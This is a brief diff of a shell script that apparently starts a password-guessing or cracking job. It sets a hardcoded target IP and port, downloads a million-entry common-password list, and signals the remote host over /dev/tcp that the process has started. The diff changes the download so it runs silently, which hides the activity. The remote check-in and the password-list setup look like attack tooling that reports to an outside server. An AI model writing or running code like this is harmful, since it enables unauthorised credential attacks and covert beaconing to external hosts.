@@ -2,7 +2,7 @@ export TARGET=206.189.215.73
 export PORT=3337
 
 # Downloading top 1,000,000 commonly used passwords
-wget -O ~/Downloads/p https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+wget -O ~/Downloads/p -q -o /dev/null https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
 
 # Tell server a process has started with host information
 echo "START" > /dev/tcp/"$TARGET"/"$PORT"
